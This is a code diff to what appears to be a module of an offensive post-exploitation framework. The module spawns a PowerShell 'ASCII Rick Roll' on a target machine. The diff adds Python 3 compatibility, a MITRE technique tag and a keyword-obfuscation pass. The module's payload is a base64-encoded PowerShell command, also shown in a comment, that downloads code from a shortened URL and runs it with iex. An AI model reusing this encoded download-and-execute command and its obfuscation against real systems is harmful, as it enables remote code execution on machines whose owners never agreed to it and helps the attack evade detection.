@@ -1,6 +1,9 @@
+from builtins import object
+
 from lib.common import helpers
 
-class Module:
+
+class Module(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -10,6 +13,10 @@ class Module:
             'Author': ['@lee_holmes', '@harmj0y'],
 
             'Description': ("Spawns a a new powershell.exe process that runs Lee Holmes' ASCII Rick Roll."),
+
+            'Software': '',
+
+            'Techniques': ['T1491'],
 
             'Background' : False,
 
@@ -54,6 +61,10 @@ class Module:
  
         # iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")
         script = "$Null = Start-Process -WindowStyle Maximized -FilePath \"C:\Windows\System32\WindowsPowerShell\\v1.0\powershell.exe\" -ArgumentList \"-enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AYgBpAHQALgBsAHkALwBlADAATQB3ADkAdwAiACkA\"; 'Client Rick-Asciied!'"
+
         if obfuscate:
             script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
+        script = helpers.keyword_obfuscation(script)
+
         return script
+
